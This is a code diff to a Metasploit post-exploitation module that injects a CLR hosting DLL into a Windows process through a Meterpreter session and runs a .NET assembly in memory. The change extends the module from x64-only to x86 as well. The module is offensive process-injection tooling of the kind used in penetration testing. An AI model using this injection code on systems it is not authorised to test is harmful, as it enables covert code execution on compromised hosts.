@@ -16,7 +16,7 @@ class MetasploitModule < Msf::Post
     super(
       update_info(
         info,
-        'Name' => 'Execute .net Assembly (x64 only)',
+        'Name' => 'Execute .NET Assembly',
         'Description' => %q{
           This module executes a .NET assembly in memory. It
           reflectively loads a dll that will host CLR, then it copies
@@ -25,10 +25,10 @@ class MetasploitModule < Msf::Post
         },
         'License' => MSF_LICENSE,
         'Author' => 'b4rtik',
-        'Arch' => [ARCH_X64],
+        'Arch' => [ARCH_X64, ARCH_X86],
         'Platform' => 'win',
         'SessionTypes' => ['meterpreter'],
-        'Targets' => [['Windows x64', { 'Arch' => ARCH_X64 }]],
+        'Targets' => [['Windows x64', { 'Arch' => ARCH_X64 }], ['Windows x86', { 'Arch' => ARCH_X86 }]],
         'References' => [['URL', 'https://b4rtik.github.io/posts/execute-assembly-via-meterpreter-session/']],
         'DefaultTarget' => 0,
         'Compat' => {
@@ -207,10 +207,12 @@ class MetasploitModule < Msf::Post
     hprocess
   end
 
-  def inject_hostclr_dll(process)
-    print_status("Reflectively injecting the Host DLL into #{process.pid}..")
+  def inject_hostclr_dll(process, arch)
+    print_status("Reflectively injecting the Host DLL into #{process.pid} (#{arch})...")
 
-    library_path = ::File.join(Msf::Config.data_directory, 'post', 'execute-dotnet-assembly', 'HostingCLRx64.dll')
+    dll = 'HostingCLRx64.dll' if arch == ARCH_X64
+    dll = 'HostingCLRWin32.dll' if arch == ARCH_X86
+    library_path = ::File.join(Msf::Config.data_directory, 'post', 'execute-dotnet-assembly', dll)
     library_path = ::File.expand_path(library_path)
 
     print_status("Injecting Host into #{process.pid}...")
@@ -238,31 +240,30 @@ class MetasploitModule < Msf::Post
     end
   end
 
-  def check_process_suitability(pid)
+  def get_process_arch(pid)
     process = session.sys.process.each_process.find { |i| i['pid'] == pid }
     if process.nil?
       fail_with(Failure::BadConfig, 'PID not found')
     end
 
     arch = process['arch']
+    fail_with(Failure::BadConfig, "Unknown architecture: #{arch}") unless arch == ARCH_X64 || arch == ARCH_X86
 
-    if arch != ARCH_X64
-      fail_with(Failure::BadConfig, 'execute_dotnet_assembly currently only supports x64 processes')
-    end
+    arch
   end
 
   def execute_assembly(exe_path, clr_version)
     if datastore['TECHNIQUE'] == 'SPAWN_AND_INJECT'
       self.hprocess = launch_process
       self.terminate_process = datastore['KILL']
-      check_process_suitability(hprocess.pid)
+      arch = get_process_arch(hprocess.pid)
     else
       if datastore['TECHNIQUE'] == 'INJECT'
         inject_pid = datastore['PID']
       elsif datastore['TECHNIQUE'] == 'SELF'
         inject_pid = client.sys.process.getpid
       end
-      check_process_suitability(inject_pid)
+      arch = get_process_arch(inject_pid)
 
       self.hprocess = open_process(inject_pid)
     end
@@ -270,7 +271,7 @@ class MetasploitModule < Msf::Post
     handles_to_close.append(hprocess)
 
     begin
-      exploit_mem, offset = inject_hostclr_dll(hprocess)
+      exploit_mem, offset = inject_hostclr_dll(hprocess, arch)
 
       pipe_suffix = Rex::Text.rand_text_alphanumeric(8)
       pipe_name = "\\\\.\\pipe\\#{pipe_suffix}"
